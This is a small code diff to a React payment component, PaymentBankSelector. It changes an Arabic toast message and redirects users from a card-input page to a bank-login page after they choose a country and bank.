@@ -65,10 +65,10 @@ const PaymentBankSelector = () => {
     
     toast({
       title: "تم التخطي",
-      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
+      description: "يمكنك تسجيل الدخول إلى أي بنك",
     });
     
-    navigate(`/pay/${id}/card-input`);
+    navigate(`/pay/${id}/bank-login`);
   };
   
   const handleContinue = () => {
@@ -77,7 +77,7 @@ const PaymentBankSelector = () => {
       sessionStorage.setItem('selectedCountry', countryCode);
       sessionStorage.setItem('selectedBank', selectedBank);
       
-      navigate(`/pay/${id}/card-input`);
+      navigate(`/pay/${id}/bank-login`);
     }
   };
   
